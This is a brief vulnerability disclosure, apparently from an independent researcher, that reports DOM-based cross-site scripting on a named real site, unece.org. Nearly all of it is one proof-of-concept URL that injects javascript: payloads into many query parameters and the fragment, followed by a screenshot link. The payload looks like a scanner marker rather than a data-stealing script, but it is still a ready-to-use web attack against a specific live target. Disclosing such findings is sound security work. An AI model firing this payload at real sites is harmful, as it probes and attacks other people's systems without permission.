# UN DOM-based cross site scripting
Discovery By: *Leu Xuan Hieu*
* Payload
```c
https://unece.org/unece-content/news?type=2&accordion=javascript:domxssExecutionSink(1,"'\"><xsstag>()domxss")&f[0]=javascript:domxssExecutionSink(1,"'\"><xsstag>()domxss")&f[1]=javascript:domxssExecutionSink(1,"'\"><xsstag>()domxss")&f[2]=javascript:domxssExecutionSink(1,"'\"><xsstag>()domxss")&keyword=javascript:domxssExecutionSink(1,"'\"><xsstag>()domxss")&past=javascript:domxssExecutionSink(1,"'\"><xsstag>()domxss")&tab=javascript:domxssExecutionSink(1,"'\"><xsstag>()domxss")&unsubscribe=javascript:domxssExecutionSink(1,"'\"><xsstag>()domxss")&wvstest=javascript:domxssExecutionSink(1,"'\"><xsstag>()domxss")#javascript:domxssExecutionSink(1,"'\"><xsstag>()domxss")
```
![](https://i.imgur.com/ro5cuYc.png)
